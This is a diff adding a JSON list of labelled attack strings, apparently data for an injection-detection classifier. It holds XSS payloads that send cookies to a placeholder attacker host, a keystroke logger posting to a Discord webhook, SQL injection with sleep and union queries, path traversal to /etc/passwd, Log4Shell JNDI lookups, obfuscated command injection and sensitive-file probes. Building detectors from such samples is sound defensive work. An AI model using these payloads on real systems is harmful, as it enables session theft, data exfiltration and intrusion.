+        "payload": "<audio autoplay controls onseeked='let test=document;location=`http://attacker?cookie=${test.cookie}`'><source src='https://portswigger-labs.net/xss/validaudio.wav' type='audio/wav'></audio>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "<input ondown=key'let test=document;location=\"http://attacker?cookie=\".concat(test.cookie)'>&password1=1&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "<Script>alert(1)</Script>",
+        "injection": true
+    },
+    {
+        "payload": "<x contenteditable onkeyup=alert(1)>press any key!",
+        "injection": true
+    },
+    {
+        "payload": "top['al\\145rt'](1)",
+        "injection": true
+    },
+    {
+        "payload": "<form onreset='let test=document;location=\"http://attacker?cookie=\".concat(test.cookie)'><input><input type='reset'>&password1=1&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "%3Csvg%20onload%3Dprompt%2526%2523x000000028%3Bdocument.domain%29%3E%0A%3Csvg%20onload%3D%250Aalert1%3E",
+        "injection": true
+    },
+    {
+        "payload": "<input autofocus onblur=alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "%22-%R3E%3C/style%3E%3C/script%3E%3Cscript%3E0x94(0x000123)%3C",
+        "injection": true
+    },
+    {
+        "payload": "<a href='java%0dscript:let test=document;location=`http://attacker?cookie=${test.cookie}`'>TEST</a>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "\"><svg onload=alert(1)>?a=reader",
+        "injection": true
+    },
+    {
+        "payload": "%0D%0ALocation:%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection\\n%3a0%0D%0A%0D%0A%3Cscript%3Ealert(1)%3C/script%3E",
+        "injection": true
+    },
+    {
+        "payload": "</script><svg onload=alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "<audio onloadedmetadata='let test=document;location=`http://attacker?cookie=${test.cookie}`'><source src='https://portswigger-labs.net/xss/validaudio.wav' type='audio/wav'></audio>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "\\\"; alert(0x000123)",
+        "injection": true
+    },
+    {
+        "payload": "<svg 1='&q='onload='/*&r=*/alert(1)'>",
+        "injection": true
+    },
+    {
+        "payload": "<form action=javascript:alert(1)><input type=submit>",
+        "injection": true
+    },
+    {
+        "payload": "<x contenteditable oninput=alert(1)>input here!",
+        "injection": true
+    },
+    {
+        "payload": "%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E",
+        "injection": true
+    },
+    {
+        "payload": "<audio autoplay controls onpause='let test=document;location=`http://attacker?cookie=${test.cookie}`'><source src='https://portswigger-labs.net/xss/validaudio.wav' type='audio/wav'></audio>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "%3Cscript%3E%5Bonerror%5D%3D%5Balert%5D%3Bthrow%201%3C%2Fscript%3E",
+        "injection": true
+    },
+    {
+        "payload": "<x onmouseout=alert(1)>hover this!",
+        "injection": true
+    },
+    {
+        "payload": "';alert(1)//",
+        "injection": true
+    },
+    {
+        "payload": "alert.apply(null, [1])",
+        "injection": true
+    },
+    {
+        "payload": "%3Cimg%20src%20onerror%3D%27let%20x%3D%211%2Cl%3D%22%22%3Bdocument.onkeypress%3Dfunction%28a%29%7Bl%2B%3Da.key%2Cx%3D%210%7D%2CsetInterval%28%28%29%3D%3E%7Bx%26%26%28fetch%28%22%2F%2Fdiscord.com%2Fapi%2Fwebhook%2F...%22%2C%7Bmethod%3A%22post%22%2Cheaders%3A%7B%22Content-Type%22%3A%22application%2Fjson%22%7D%2Cbody%3AJSON.stringify%28%7Bcontent%3Al%7D%29%7D%29%2Cx%3D%211%29%7D%2C1e3%29%3B%27%3E",
+        "injection": true
+    },
+    {
+        "payload": "'onload=alert(1)><svg/1='",
+        "injection": true
+    },
+    {
+        "payload": "<a href='javascript%0a:let test=document;location=`http://attacker?cookie=${test.cookie}`'>TEST</a>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "'\\\"-></style></script><script>alert(0x000123)</script>",
+        "injection": true
+    },
+    {
+        "payload": "%3Csvg%20onload%3Dprompt%2526%2523x000000028%3Bdocument.domain%29%3E%0A%3Csvg%20onload%3D%250Aalert1%3E",
+        "injection": true
+    },
+    {
+        "payload": "<script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js>\\n</script><x ng-app ng-csp>{{constructor.constructor('alert(1)')()}}",
+        "injection": true
+    },
+    {
+        "payload": "onload=function(){$.getScript('//brutelogic.com.br/2.js')}",
+        "injection": true
+    },
+    {
+        "payload": "'-alert(1)//",
+        "injection": true
+    },
+    {
+        "payload": "%3Chtml%20ontouchend%3Dalert%281%29%3E",
+        "injection": true
+    },
+    {
+        "payload": "\\\"<scr<script>ipt>alert(0x000123)<scr</script><ipt",
+        "injection": true
+    },
+    {
+        "payload": "<marquee onstart=alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "<x oncut=alert(1)>copy this!",
+        "injection": true
+    },
+    {
+        "payload": "%3Cbody%20onresize%3Dalert%281%29%3Epress%20F12%21",
+        "injection": true
+    },
+    {
+        "payload": "<script/test>let test=document;location=`http://attacker?cookie=${test%RND%.cookie}`;</script <a>&password1=1&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "<img\\nsrc=data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=\\nonload=alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "%3Cselect%20onchange%3Dalert%281%29%3E%3Coption%3E1%3Coption%3E2",
+        "injection": true
+    },
+    {
+        "payload": "<form><button formaction=javascript:alert(1)>click",
+        "injection": true
+    },
+    {
+        "payload": "<%0a%0dscript%0a%0d>alert%0a%0d(%0a%0d'1'%0a%0d)",
+        "injection": true
+    },
+    {
+        "payload": "<svg/onload=innerHTML=location.hash> #<img/src/onerror=alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "<a href='javascript%0d:let test=document;location=`http://attacker?cookie=${test.cookie}`'>TEST</a>&password1=&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "<body onload=alert(1)>",
+        "injection": true
+    },
+    {
+        "payload": "<iframe srcdoc=<svg/o%26%23x6Eload%26equals%3Balert%26lpar%3B1)%26gt%3B>",
+        "injection": true
+    },
+    {
+        "payload": "onload=x=>$.getScript('//brutelogic.com.br/2.js')",
+        "injection": true
+    },
+    {
+        "payload": "<input autofocus onblur='let test=document;location=\"http://attacker?cookie=\".concat(test.cookie)'>&password1=1&enter=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C+%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81",
+        "injection": true
+    },
+    {
+        "payload": "'''*/onmouseover=(print)?.()><sVg/oNload='1>(_=prompt,_`{{7*7}}`)'></sTyle/</scRIpt/</textArea/</noScript/</tiTle/-->%EF%BC%9Ch1/<h1><image/onerror='alert`1`%27'src>xhzeem%22%3E%3CSvg/\\u0022\\u003e\\u003csVg/\\x22\\x3e\\x3csVg/&quot;&gt;&lt;svG/onload=alert`2`",
+        "injection": true
+    },
+    {
+        "payload": "/id/1%20union%20select%20user%20from%20password",
+        "injection": true
+    },
+    {
+        "payload": "/id/1 union select user from password",
+        "injection": true
+    },
+    {
+        "payload": "/id/1 union select user from password",
+        "injection": true
+    },
+    {
+        "payload": "%3C%21--%23exec%20cmd=%22cd%20%2Froot%2Fdir%2F%22%3E",
+        "injection": true
+    },
+    {
+        "payload": "%3C%21--%23echo%20var=%22DOCUMENT_NAME%22%20--%3E",
+        "injection": true
+    },
+    {
+        "payload": "%3C%21--%23exec%20cmd=%22cd%20C%3A%5C%5Cadmin%5C%5Cdir%22%3E",
+        "injection": true
+    },
+    {
+        "payload": "%3C%21--%23exec%20cmd=%5C%22ls%5C%22%20--%3E",
+        "injection": true
+    },
+    {
+        "payload": "%3C%21--%23exec%20cmd=%22dir%22%20--%3E",
+        "injection": true
+    },
+    {
+        "payload": "db.collection.find( { $where: function() { return (this.name == $userData) } } );",
+        "injection": true
+    },
+    {
+        "payload": "%27%3B%20return%20%27%27%20==%20%27",
+        "injection": true
+    },
+    {
+        "payload": "/do.php\\u0023.png",
+        "injection": true
+    },
+    {
+        "payload": "/%2e/backup.zip",
+        "injection": true
+    },
+    {
+        "payload": "/do.php%23.png",
+        "injection": true
+    },
+    {
+        "payload": "/%3Bcat%20%2Fet%3F%2Fpa%3F%3Fwd/../",
+        "injection": true
+    },
+    {
+        "payload": "/.git/index",
+        "injection": true
+    },
+    {
+        "payload": "/.suspected",
+        "injection": true
+    },
+    {
+        "payload": "/do.php%0A.png",
+        "injection": true
+    },
+    {
+        "payload": "/do.php\n.png",
+        "injection": true
+    },
+    {
+        "payload": "/do.php\\u000a.png",
+        "injection": true
+    },
+    {
+        "payload": "/%2e/dmp.sql",
+        "injection": true
+    },
+    {
+        "payload": "/%2e/config.php.bak",
+        "injection": true
+    },
+    {
+        "payload": "/backup/db.gz",
+        "injection": true
+    },
+    {
+        "payload": "/settings.php.swp",
+        "injection": true
+    },
+    {
+        "payload": "/do.php\\u560a.png",
+        "injection": true
+    },
+    {
+        "payload": "/.svn/entries",
+        "injection": true
+    },
+    {
+        "payload": "/db.sql",
+        "injection": true
+    },
+    {
+        "payload": "/do.php;.png",
+        "injection": true
+    },
+    {
+        "payload": "/db.sql.gz",
+        "injection": true
+    },
+    {
+        "payload": "/do.php%E5%98%8A.png",
+        "injection": true
+    },
+    {
+        "payload": "/.git",
+        "injection": true
+    },
+    {
+        "payload": "/wso.php",
+        "injection": true
+    },
+    {
+        "payload": "/wp-settings.php.swp",
+        "injection": true
+    },
+    {
+        "payload": "/do.php\\u003b.png",
+        "injection": true
+    },
+    {
+        "payload": "/do.php%3B.png",
+        "injection": true
+    },
+    {
+        "payload": "/.gitconfig",
+        "injection": true
+    },
+    {
+        "payload": "/do.php#.png",
+        "injection": true
+    },
+    {
+        "payload": "/backup.gz",
+        "injection": true
+    },
+    {
+        "payload": "%220%5C%22XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%289%29%2C0%29%29XOR%5C%22Z",
+        "injection": true
+    },
+    {
+        "payload": "%27%20AND%20%28SELECT%208871%20FROM%20%28SELECT%28SLEEP%285%29%29%29uZxz%29",
+        "injection": true
+    },
+    {
+        "payload": "%27%20un%e2%80%8bion se%e2%80%8blect 1%e2%80%8b,2%e2%80%8b,3%e2%80%8b,4%e2%80%8b,5%e2%80%8b,6%e2%80%8b,7%e2%80%8b,8%e2%80%8b,9%e2%80%8b,0%e2%80%8b,11",
+        "injection": true
+    },
+    {
+        "payload": "%27%20un%5C%22%2C%5C%22ion%20se%5C%22%2C%5C%22lect%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C0%2C11",
+        "injection": true
+    },
+    {
+        "payload": "(SELECT*FROM(SELECT(SLEEP(10)))a)",
+        "injection": true
+    },
+    {
+        "payload": "name[0+;select+sleep(8);;#++]=user&pass=pass",
+        "injection": true
+    },
+    {
+        "payload": "1%27/**/%256fR/**/50%2521%253D22%253B%2523",
+        "injection": true
+    },
+    {
+        "payload": "query=login&username=rrr';SELECT PG_SLEEP(5)--&password=rr&submit=Login",
+        "injection": true
+    },
+    {
+        "payload": "admin'; -- -",
+        "injection": true
+    },
+    {
+        "payload": "%2F%2A%21u%256eion%2A%2F%20%2F%2A%21se%256cect%2A%2F%20%281%29%2C%282%29%2C%283%29%2C%284%29%2C%285%29%2C%286%29%2C%287%29%2C%288%29%2C%289.%29%2C%280x70656e746573746974%29%2C%2811%29",
+        "injection": true
+    },
+    {
+        "payload": "%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%20%281%29%2C%282%29%2C%283%29%2C%284%29%2C%285%29%2C%286%29%2C%287%29%2C%288%29%2C%289%29%2C%280x70656e746573746974%29%2C%2811%29",
+        "injection": true
+    },
+    {
+        "payload": "0'XOR(if(now()=sysdate(),sleep(6-2),0))XOR'Z",
+        "injection": true
+    },
+    {
+        "payload": "uni%5C%22%2C%5C%22on%20sel%5C%22%2C%5C%22ect%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%27%2C11",
+        "injection": true
+    },
+    {
+        "payload": "admin' AND '1'='1",
+        "injection": true
+    },
+    {
+        "payload": "%27%20or%20%2F%2A%21u%256eion%2A%2F%20%2F%2A%21se%256cect%2A%2F%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%20%27--",
+        "injection": true
+    },
+    {
+        "payload": "admin' AND '1'='2",
+        "injection": true
+    },
+    {
+        "payload": "%27%20union%2B%2F%2A%21select%2A%2F%20%281%29%2C%282%29%2C%283%29%2C%284%29%2C%285%29%2C%286%29%2C%287%29%2C%288%29%2C%289%29%2C%280x70656e746573746974%29%2C%2811%29",
+        "injection": true
+    },
+    {
+        "payload": "%27%20union%28select%281%29%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C0x70656e746573746974%2C11%29",
+        "injection": true
+    },
+    {
+        "payload": "/app//////////////////../../../../../../../../etc/passwd",
+        "injection": true
+    },
+    {
+        "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%2Fetc%2Fpasswd",
+        "injection": true
+    },
+    {
+        "payload": "..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C%252Fetc%252Fpasswd",
+        "injection": true
+    },
+    {
+        "payload": "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini",
+        "injection": true
+    },
+    {
+        "payload": "%24%7Bjndi%3A%24%7Blower%3Al%7D%24%7Blower%3Ad%7Da%24%7Blower%3Ap%7D%3A%2F%2Fex%24%7Bupper%3Aa%7Dmple.com",
+        "injection": true
+    },
+    {
+        "payload": "%24%5C%7B%24%5C%7B%3A%3A-j%5C%7D%24%5C%7B%3A%3A-n%5C%7D%24%5C%7B%3A%3A-d%5C%7D%24%5C%7B%3A%3A-i%5C%7D%3A%24%5C%7B%3A%3A-r%5C%7D%24%5C%7B%3A%3A-m%5C%7D%24%5C%7B%3A%3A-i%5C%7D%3A%2F%2F%24%5C%7Benv%3AUSER%5C%7D.example.com",
+        "injection": true
+    },
+    {
+        "payload": "%24%7Bjndi%3Adns%3A%2F%2Fexample.com%2Fa%7D",
+        "injection": true
+    },
+    {
+        "payload": "%3B%20cat%20%2Fet%27c%2Fpa%27ss%27wd",
+        "injection": true
+    },
+    {
+        "payload": "%3B%20cat%20%2Fet%e2%80%8b%3F%2F%e2%80%8bpa%e2%80%8b%3F%3Fwd",
+        "injection": true
+    },
+    {
+        "payload": "%24%7B%24%7Benv%3AENV_NAME%3A-j%7Dn%24%7Benv%3AENV_NAME%3A-d%7Di%24%7Benv%3AENV_NAME%3A-%3A%7D%24%7Benv%3AENV_NAME%3A-l%7Dd%24%7Benv%3AENV_NAME%3A-a%7Dp%24%7Benv%3AENV_NAME%3A-%3A%7D%2F%2Fexample.com%2F",
+        "injection": true
+    },
+    {
+        "payload": "%240%3C%3C%3C%24%5C%27%5C%5C%24%28%28%24%28%281%3C%3C1%29%29%2310011010%29%29%5C%5C%24%28%28%24%28%281%3C%3C1%29%29%2310100011%29%29%5C%27",
+        "injection": true
+    },
+    {
+        "payload": "%24%7B%24%7B%3A%3A-j%7D%24%7B%3A%3A-n%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-i%7D%24%7B%3A%3A-r%7D%24%7B%3A%3A-m%7D%24%7B%3A%3A-i%7D%3A%2F%2Fexample.com",
+        "injection": true
+    },
+    {
+        "payload": "%3B%20e%27c%27ho%20%27swd%20test%20pentest%27%20%7Cawk%20%27%7Bprint%20%5C%22cat%20%2Fetc%2Fpas%5C%22%241%7D%27%20%7Cbas%27h",
+        "injection": true
+    },
+    {
+        "payload": "%3B%20c%5C%5Ca%5C%5Ct%20%5C%5C%2F%5C%5Ce%5C%5Ct%5C%5Cc%2F%5C%5Cp%5C%5Ca%5C%5Cs%5C%5Csw%5C%5Cd",
+        "injection": true
+    },
+    {
+        "payload": "%3C%3F%3D%60%7B%24%7B~%22%5Cxa0%5Cxb8%5Cxba%5Cxab%22%7D%5B%22%5Cxa0%22%5D%7D%60%3B",
+        "injection": true
+    },
+    {
+        "payload": "%3B%20cat%24u%2B%2Fetc%24u%2Fpasswd%24u",
+        "injection": true
+    },
+    {
+        "payload": "$(ping${IFS}-nc${IFS}2${IFS}`whoami`.{{interactsh-url}})",
+        "injection": true
+    },
+    {
+        "payload": "%3B%20cat%20%2Fet%3F%2Fpa%3Fswd",
+        "injection": true
+    },
+    {
+        "payload": "cmd=127.0.0.1%2B%2526%2526%2Bls+/etc",
+        "injection": true
+    }
+]
